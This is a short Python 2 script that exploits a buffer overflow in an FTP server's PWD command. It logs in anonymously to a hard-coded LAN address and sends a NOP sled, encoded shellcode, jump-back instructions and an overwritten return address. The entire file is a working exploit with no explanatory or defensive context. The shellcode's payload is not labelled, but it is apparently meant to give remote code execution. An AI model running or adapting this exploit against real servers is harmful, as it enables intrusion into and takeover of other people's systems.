#!/usr/bin/python

import socket, time

buf =  ""
buf += "\xbf\xdb\x89\xe1\xb0\xda\xd1\xd9\x74\x24\xf4\x58\x29"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x78\x0e\x03\xa3\x87\x03"
buf += "\x45\xaf\x70\x41\xa6\x4f\x81\x26\x2e\xaa\xb0\x66\x54"
buf += "\xbf\xe3\x56\x1e\xed\x0f\x1c\x72\x05\x9b\x50\x5b\x2a"
buf += "\x2c\xde\xbd\x05\xad\x73\xfd\x04\x2d\x8e\xd2\xe6\x0c"
buf += "\x41\x27\xe7\x49\xbc\xca\xb5\x02\xca\x79\x29\x26\x86"
buf += "\x41\xc2\x74\x06\xc2\x37\xcc\x29\xe3\xe6\x46\x70\x23"
buf += "\x09\x8a\x08\x6a\x11\xcf\x35\x24\xaa\x3b\xc1\xb7\x7a"
buf += "\x72\x2a\x1b\x43\xba\xd9\x65\x84\x7d\x02\x10\xfc\x7d"
buf += "\xbf\x23\x3b\xff\x1b\xa1\xdf\xa7\xe8\x11\x3b\x59\x3c"
buf += "\xc7\xc8\x55\x89\x83\x96\x79\x0c\x47\xad\x86\x85\x66"
buf += "\x61\x0f\xdd\x4c\xa5\x4b\x85\xed\xfc\x31\x68\x11\x1e"
buf += "\x9a\xd5\xb7\x55\x37\x01\xca\x34\x50\xe6\xe7\xc6\xa0"
buf += "\x60\x7f\xb5\x92\x2f\x2b\x51\x9f\xb8\xf5\xa6\xe0\x92"
buf += "\x42\x38\x1f\x1d\xb3\x11\xe4\x49\xe3\x09\xcd\xf1\x68"
buf += "\xc9\xf2\x27\x3e\x99\x5c\x98\xff\x49\x1d\x48\x68\x83"
buf += "\x92\xb7\x88\xac\x78\xd0\x23\x57\xeb\x1f\x1b\x57\xa9"
buf += "\xf7\x5e\x57\x2c\xb3\xd6\xb1\x44\xd3\xbe\x6a\xf1\x4a"
buf += "\x9b\xe0\x60\x92\x31\x8d\xa3\x18\xb6\x72\x6d\xe9\xb3"
buf += "\x60\x1a\x19\x8e\xda\x8d\x26\x24\x72\x51\xb4\xa3\x82"
buf += "\x1c\xa5\x7b\xd5\x49\x1b\x72\xb3\x67\x02\x2c\xa1\x75"
buf += "\xd2\x17\x61\xa2\x27\x99\x68\x27\x13\xbd\x7a\xf1\x9c"
buf += "\xf9\x2e\xad\xca\x57\x98\x0b\xa5\x19\x72\xc2\x1a\xf0"
buf += "\x12\x93\x50\xc3\x64\x9c\xbc\xb5\x88\x2d\x69\x80\xb7"
buf += "\x82\xfd\x04\xc0\xfe\x9d\xeb\x1b\xbb\xbe\x09\x89\xb6"
buf += "\x56\x94\x58\x7b\x3b\x27\xb7\xb8\x42\xa4\x3d\x41\xb1"
buf += "\xb4\x34\x44\xfd\x72\xa5\x34\x6e\x17\xc9\xeb\x8f\x32"


jmp =  "\x83\xeb\x32" * 8
jmp += "\xff\xe3"

buffer = "\x90" * (1153 - len(buf)) + buf + "B" * (40-len(jmp)) + jmp + "\x8b\x6f\xf6\x77"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.109",21))
time.sleep(1)
r = s.recv(1024)

s.send("USER anonymous\r\n")
r = s.recv(1024)

s.send("PASS anonymous\r\n")
r = s.recv(1024)

s.send("PWD"+buffer+"\r\n")
r = s.recv(1024)
print r
